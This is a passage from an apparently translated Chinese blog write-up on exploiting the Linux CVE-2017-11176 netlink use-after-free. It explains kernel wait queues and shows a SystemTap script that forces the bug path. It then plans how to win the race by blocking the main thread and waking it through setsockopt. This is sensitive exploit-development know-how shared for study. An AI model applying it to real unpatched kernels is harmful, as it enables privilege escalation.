class="comment"> * It may be assumed that this function implies a write memory barrier before</span></span><br><span class="line"><span class="comment"> * changing the task state if and only if any tasks are woken up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __wake_up(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">unsigned</span> <span class="keyword">int</span> mode,</span><br><span class="line">            <span class="keyword">int</span> nr_exclusive, <span class="keyword">void</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __wake_up_common(q, mode, nr_exclusive, <span class="number">0</span>, key);    <span class="comment">// &lt;----- here</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> __wake_up_common(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">unsigned</span> <span class="keyword">int</span> mode,</span><br><span class="line">          <span class="keyword">int</span> nr_exclusive, <span class="keyword">int</span> wake_flags, <span class="keyword">void</span> *key)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">wait_queue_t</span> *curr, *next;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> flags = curr-&gt;flags;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (curr-&gt;func(curr, mode, wake_flags, key) &amp;&amp;</span><br><span class="line">            (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此函数迭代wait queue[0]中的每个元素（<strong>list_for_each_entry_safe()**是与双向链表一起使用的公共宏）。对于每个元素，它调用</strong>func()<strong>回调函数[1]。还记得</strong>DECLARE_WAITQUEUE()<strong>宏吗？它将func回调设置成</strong>default_wake_function()**：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __WAITQUEUE_INITIALIZER(name, tsk) &#123;                \</span></span><br><span class="line">    .<span class="keyword">private</span>    = tsk,                      \</span><br><span class="line">    .func       = default_wake_function,            \                 <span class="comment">// &lt;------</span></span><br><span class="line">    .task_list  = &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line">#define DECLARE_WAITQUEUE(name, tsk)                    \</span><br><span class="line">    <span class="keyword">wait_queue_t</span> name = __WAITQUEUE_INITIALIZER(name, tsk)</span><br></pre></td></tr></table></figure>

<p>反过来，<strong>default_wake_function()**只使用wait queue元素的私有字段调用</strong>try_to_wake_up()**（在大多数情况下指向睡眠的任务的task_struct）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">default_wake_function</span><span class="params">(<span class="keyword">wait_queue_t</span> *curr, <span class="keyword">unsigned</span> mode, <span class="keyword">int</span> wake_flags,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> try_to_wake_up(curr-&gt;<span class="keyword">private</span>, mode, wake_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，<strong>try_to_wake_up()**是</strong>schedule()<strong>的对立面，当</strong>schedult()<strong>调出当前任务时，</strong>try_to_wake_up()**可使其再次可调度。也就是说，它将其置于run queue中并改变其运行状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">try_to_wake_up</span><span class="params">(struct task_struct *p, <span class="keyword">unsigned</span> <span class="keyword">int</span> state,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">int</span> wake_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut (find the appropriate run queue) ...</span></span><br><span class="line"></span><br><span class="line">out_activate:</span><br><span class="line">    schedstat_inc(p, se.nr_wakeups);              <span class="comment">// &lt;----- update some stats</span></span><br><span class="line">    <span class="keyword">if</span> (wake_flags &amp; WF_SYNC)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_sync);</span><br><span class="line">    <span class="keyword">if</span> (orig_cpu != cpu)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_migrate);</span><br><span class="line">    <span class="keyword">if</span> (cpu == this_cpu)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_local);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_remote);</span><br><span class="line">    activate_task(rq, p, en_flags);               <span class="comment">// &lt;----- put it back to run queue!</span></span><br><span class="line">    success = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    p-&gt;state = TASK_RUNNING;                      <span class="comment">// &lt;----- the state has changed!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是调用<strong>activate_task()**的地方（还有其他地方），因为任务现在回到run queue中并且其状态为TASK_RUNNING，所以它可能被调度。因此，在调用</strong>schedule()**时的位置继续执行。</p>
<p>实际上，很少直接调用**__wake_up()**而是调用辅助宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up(x)          __wake_up(x, TASK_NORMAL, 1, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_nr(x, nr)       __wake_up(x, TASK_NORMAL, nr, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_all(x)          __wake_up(x, TASK_NORMAL, 0, NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible(x)    __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible_all(x)    __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL)</span></span><br></pre></td></tr></table></figure>

<h4 id="一个完整的示例"><a href="#一个完整的示例" class="headerlink" title="一个完整的示例"></a>一个完整的示例</h4><p>这是一个简单的例子来总结上述概念：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">resource_a</span> &#123;</span></span><br><span class="line">  <span class="keyword">bool</span> resource_is_ready;</span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> wq;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_0_wants_resource_a</span><span class="params">(struct resource_a *res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!res-&gt;resource_is_ready) &#123;</span><br><span class="line">    <span class="comment">// &quot;register&quot; to be woken up</span></span><br><span class="line">    DECLARE_WAITQUEUE(task0_wait_element, current);</span><br><span class="line">    add_wait_queue(&amp;res-&gt;wq, &amp;task0_wait_element);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start sleeping</span></span><br><span class="line">    __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">    schedule();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We&#x27;ll restart HERE once woken up</span></span><br><span class="line">    <span class="comment">// Remember to &quot;unregister&quot; from wait queue</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">XXX:</span> ... do something with the resource ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_1_makes_resource_available</span><span class="params">(struct resource_a *res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  res-&gt;resource_is_ready = <span class="literal">true</span>;</span><br><span class="line">  wake_up_interruptible_all(&amp;res-&gt;wq);  <span class="comment">// &lt;--- unblock &quot;task 0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个线程运行<strong>task_0_tants_resource_a()**后，会因为资源不可用而被阻塞，在某些时候，资源所有者（来自另一个线程）使其可用并调用</strong>task_1_makes_resource_available()<strong>。在此之后，</strong>task_0_tants_resource_a()**可恢复执行。</p>
<p>我们经常在Linux内核代码中看到pattern，你现在知道它的含义。注意术语“资源”在这以通用方式使用。任务可以等待事件、条件为真或其他情况。每当你看到一个阻塞系统调用时，等待队列的可能性就不大了（Every time you see a “blocking” syscall, chances are a wait queue is not that far）。</p>
<h3 id="0x02-Unblocking-the-Main-Thread"><a href="#0x02-Unblocking-the-Main-Thread" class="headerlink" title="0x02 Unblocking the Main Thread"></a>0x02 Unblocking the Main Thread</h3><p>在<a href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/">此前的文章</a>中，我们尝试并解决了强制<strong>netlink_attachskb()**返回1时的几个问题。第一个问题是调用</strong>mq_notify()<strong>时被阻塞。为了解决这个问题，我们简单地</strong>绕过<strong>了对</strong>schedule_timeout()<strong>的调用，但随后又进入了</strong>无限循环<strong>。我们通过从文件描述符表（FDT）中删除目标文件描述符来停止循环，这偶然满足了一个条件：它使第二个</strong>fget()*<em>调用返回NULL。这是通过</em>System Tap*脚本完成的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    function force_trigger:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">    %&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">[<span class="number">0</span>]   sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD); <span class="comment">// avoid blocking the thread</span></span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">      nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">      fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">    %&#125;</span><br></pre></td></tr></table></figure>

<p>在这一章中，我们将会尝试移除脚本中[0]处的代码，这意味着**mq_notify()**的调用会重新阻塞。在这我们有两种解决办法：</p>
<ol>
<li>如同stap脚本一样把sock标记为SOCK_DEAD</li>
<li>Unblock thread</li>
</ol>
<h4 id="控制并赢得条件竞争"><a href="#控制并赢得条件竞争" class="headerlink" title="控制并赢得条件竞争"></a>控制并赢得条件竞争</h4><p>我们的主线程被阻止实际上是一件好事，还记得补丁描述了一个关于“窗口”的东西？我们的攻击场景是什么？</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true" alt="流程图"></p>
<p>所以，“小窗口”是我们有机会调用close()的地方。调用close()将使fget()的调用返回NULL。窗口本身在调用fget()成功后开启，并在第二次调用fget()之前关闭。在攻击场景中，我们在netlink_attachskb()之后调用close()，但是在stap脚本中，我们实际上是在调用netlink_attachskb()之前模拟了它。</p>
<p>如果我们绕过调用schedule_timeout()，那么竞争窗口确实是“小”的。这不是System Tap的问题，因为我们在调用netlink_attachskb()之前修改了内核数据，我们在用户态不会拥有这种权限。</p>
<p>另一方面，如果我们可以在netlink_attachskb()中间阻塞并有办法恢复它，那么竞争窗口实际上就比我们想的要大。换句话说，我们就有办法<strong>控制竞争条件</strong>，我们可以将其视作在主线程中设置了“断点”。</p>
<p>(图待上传)</p>
<p>阻塞主线程似乎是赢得条件竞争的一个好方法，但这意味着我们需要有办法恢复被阻塞的主线程。</p>
<h4 id="Identify-“unblocker”-candidates"><a href="#Identify-“unblocker”-candidates" class="headerlink" title="Identify “unblocker” candidates"></a>Identify “unblocker” candidates</h4><p>在本节中，我们将看到netlink_attachskb()如何被阻塞及解除阻塞。再来看下netlink_attachskb()的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">[<span class="number">0</span>]     DECLARE_WAITQUEUE(wait, current);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!*timeo) &#123;</span><br><span class="line">          <span class="comment">// ... cut (unreachable code from mq_notify) ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]     __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">[<span class="number">2</span>]     add_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">            !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">[<span class="number">4</span>]       *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]     __set_current_state(TASK_RUNNING);</span><br><span class="line">[<span class="number">6</span>]     remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">        sock_put(sk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">          kfree_skb(skb);</span><br><span class="line">          <span class="keyword">return</span> sock_intr_errno(*timeo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      skb_set_owner_r(skb, sk);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>__set_current_state(TASK_INTERRUPTIBLE)</strong>[1]和<strong>schedule_timeout()</strong>[4]的结合使得线程被阻塞，条件[3]为真是因为：</p>
<ul>
<li>我们使用System Tap强制<em>nlk-&gt;state |= 1</em></li>
<li>sock不是DEAD，我们移除了脚本中的<em>sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD)</em></li>
</ul>
<p><strong>注</strong>：调用schedule_timeout(MAX_SCHEDULE_TIMEOUT)与调用schedule()等价。</p>
<p>众所周知，如果被阻塞的线程已注册到<strong>wake queue</strong>中，则可以将其唤醒，该注册使用[0]和[2]，而注销在[6]中完成。等待队列本身是<strong>nlk-&gt; wait</strong>。也就是说，它属于netlink_sock对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     <span class="title">sk</span>;</span></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span>   wait;           <span class="comment">// &lt;----- the wait queue</span></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这意味着，<strong>netlink_sock对象负责唤醒被阻塞的线程</strong>。</p>
<p><em>nlk-&gt;wait</em> wait queue在四个地方被使用：</p>
<ol>
<li>__netlink_create()</li>
<li>netlink_release()</li>
<li>netlink_rcv_wake()</li>
<li>netlink_setsockopt()</li>
</ol>
<p>函数__netlink_create()在netlink socket创建的时候被调用，它通过**init_waitqueue_head()**函数初始化一个空的wait queue。</p>
<p>当关联的struct file即将被释放时，将调用函数<strong>netlink_release()**（refcounter变为零）。它调用</strong>wake_up_interruptible_all()**。</p>
<p>函数netlink_rcv_wake()由<strong>netlink_recvmsg()**调用并调用</strong>wake_up_interruptible()*<em>。它这么做实际上是有道理的，因为阻塞的第一个原因是因为接收缓冲区已满。如果调用</em>netlink_recvmsg()*，则接收缓冲区中可能会有更多的空闲空间。</p>
<p>最后，<em>netlink_setsockopt()<em>由系统调用</em>setsockopt()<em>调用。如果optname是</em></em>NETLINK_NO_ENOBUFS<strong>，会调用</strong>wake_up_interruptible()**。</p>
<p>所以我们有三种候选方案来唤醒我们的线程（__netlink_create()除外，它没有唤醒任何东西）。面对这些选择时，我们需要一条路径：</p>
<ul>
<li>快速到达我们所需要的目标（在我们的例子中为wake_up_interruptible()），也就是说，少量的函数调用和条件约束等</li>
<li>对内核几乎没有影响和副作用（没有内存分配，不要触及其他数据结构等）</li>
</ul>
<p>因为我们不想释放与sock相关的struct file并且这是我们可以触发use-after-free的可控方法，我们不使用netlink_release()。</p>
<p>netlink_rcv_wake()路径是最“复杂”的路径，在从recvmsg()系统调用到达它之前，我们需要在<em>generic</em> sock API中通过几个检查，它还分配各种东西等。调用追踪：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- SYSCALL_DEFINE3(recvmsg)</span><br><span class="line">- __sys_recvmsg</span><br><span class="line">- sock_recvmsg</span><br><span class="line">- __sock_recvmsg</span><br><span class="line">- __sock_recvmsg_nosec  // calls sock-&gt;ops-&gt;recvmsg()</span><br><span class="line">- netlink_recvmsg</span><br><span class="line">- netlink_rcv_wake</span><br><span class="line">- wake_up_interruptible</span><br></pre></td></tr></table></figure>

<p>与之相对比的是setsockopt()：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SYSCALL_DEFINE5(setsockopt) // calls sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">- netlink_setsockopt()</span><br><span class="line">- wake_up_interruptible</span><br></pre></td></tr></table></figure>

<h4 id="Reaching-wake-up-interruptible-from-setsockopt-syscall"><a href="#Reaching-wake-up-interruptible-from-setsockopt-syscall" class="headerlink" title="Reaching wake_up_interruptible() from setsockopt syscall"></a>Reaching wake_up_interruptible() from setsockopt syscall</h4><p>在之前的小节中，调用wake_up_interruptible()最简单的方法是通过setsockopt系统调用。现在分析下有哪些检查是需要我们绕过的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [net/socket.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE5(setsockopt, <span class="keyword">int</span>, fd, <span class="keyword">int</span>, level, <span class="keyword">int</span>, optname,</span><br><span class="line">        <span class="keyword">char</span> __user *, optval, <span class="keyword">int</span>, optlen)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> err, fput_needed;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (optlen &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">      sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (sock != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = security_socket_setsockopt(sock, level, optname);</span><br><span class="line">[<span class="number">2</span>]     <span class="keyword">if</span> (err)</span><br><span class="line">          <span class="keyword">goto</span> out_put;</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">          err =</span><br><span class="line">              sock_setsockopt(sock, level, optname, optval,</span><br><span class="line">                  optlen);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          err =</span><br><span class="line">[<span class="number">4</span>]           sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">                  optlen);</span><br><span class="line">    out_put:</span><br><span class="line">        fput_light(sock-&gt;file, fput_needed);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要：</p>
<ul>
<li>[0] - <strong>optlen</strong>非负</li>
<li>[1] - <strong>fd</strong>是一个有效的的socket</li>
<li>[2] - LSM<strong>必须</strong>允许我们对socket调用setsockopt()</li>
<li>[3] - <strong>level</strong>与SOL_SOCKET不同</li>
</ul>
<p>如果我们绕过了这些检查，netlink_setsockopt()[4]将会被调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = <span class="title">nlk_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]   <span class="keyword">if</span> (level != SOL_NETLINK)</span><br><span class="line">        <span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">[<span class="number">6</span>]   <span class="keyword">if</span> (optlen &gt;= <span class="keyword">sizeof</span>(<span class="keyword">int</span>) &amp;&amp; get_user(val, (<span class="keyword">unsigned</span> <span class="keyword">int</span> __user *)optval))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">        <span class="comment">// ... cut (other options) ...</span></span><br><span class="line"></span><br><span class="line">[<span class="number">7</span>]   <span class="keyword">case</span> NETLINK_NO_ENOBUFS:</span><br><span class="line">[<span class="number">8</span>]     <span class="keyword">if</span> (val) &#123;</span><br><span class="line">          nlk-&gt;flags |= NETLINK_RECV_NO_ENOBUFS;</span><br><span class="line">          clear_bit(<span class="number">0</span>, &amp;nlk-&gt;state);</span><br><span class="line">[<span class="number">9</span>]       wake_up_interruptible(&amp;nlk-&gt;wait);</span><br><span class="line">        &#125; <span 